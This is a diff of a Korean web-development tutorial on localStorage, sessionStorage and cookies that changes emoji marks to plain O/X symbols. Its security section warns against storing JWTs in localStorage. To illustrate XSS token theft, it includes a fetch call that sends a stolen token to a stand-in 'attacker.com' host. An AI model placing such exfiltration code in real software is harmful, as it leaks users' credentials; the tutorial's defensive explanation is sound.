@@ -35,7 +35,7 @@ localStorage.clear();
 |---|---|---|---|
 |**유지 기간**|영구|탭 닫으면 삭제|만료일 설정|
 |**용량**|~5MB|~5MB|~4KB|
-|**서버 전송**|❌|❌|✅ (자동)|
+|**서버 전송**|X|X|O (자동)|
 |**접근 범위**|같은 출처|같은 탭|설정에 따라|
 
 ## 주의사항
@@ -43,15 +43,15 @@ localStorage.clear();
 ### 보안 문제 - XSS 취약점
 
 ```javascript
-// ❌ JWT 토큰을 localStorage에 저장하면
+// X JWT 토큰을 localStorage에 저장하면
 localStorage.setItem('token', 'jwt_token_here');
 
 // XSS 공격으로 스크립트 삽입 시 토큰 탈취 가능
 // 악의적인 스크립트가 실행되면
 const stolen = localStorage.getItem('token');
-fetch('https://attacker.com?token=' + stolen);  // 토큰 탈취 ❌
+fetch('https://attacker.com?token=' + stolen);  // 토큰 탈취 X
 
-// ✅ 민감한 인증 정보는 HttpOnly Cookie에 저장
+// O 민감한 인증 정보는 HttpOnly Cookie에 저장
 // HttpOnly Cookie는 JS로 접근 불가 → XSS 방어
 ```
 
@@ -59,7 +59,7 @@ fetch('https://attacker.com?token=' + stolen);  // 토큰 탈취 ❌
 
 ```javascript
 // localStorage는 동기 API → 대용량 데이터 처리 시 UI 멈춤
-localStorage.setItem('bigData', JSON.stringify(hugeArray));  // ❌
+localStorage.setItem('bigData', JSON.stringify(hugeArray));  // X
 
 // 대용량 데이터는 IndexedDB 사용 (비동기)
 ```
@@ -67,13 +67,13 @@ localStorage.setItem('bigData', JSON.stringify(hugeArray));  // ❌
 ## 적합한 사용 사례
 
 ```
-✅ 적합
+O 적합
 - 사용자 UI 설정 (다크모드, 언어 설정)
 - 비로그인 장바구니
 - 최근 검색어
 - 민감하지 않은 사용자 환경설정
 
-❌ 부적합
+X 부적합
 - JWT 토큰, 인증 정보 (XSS 취약)
 - 개인정보, 결제 정보
 - 대용량 데이터
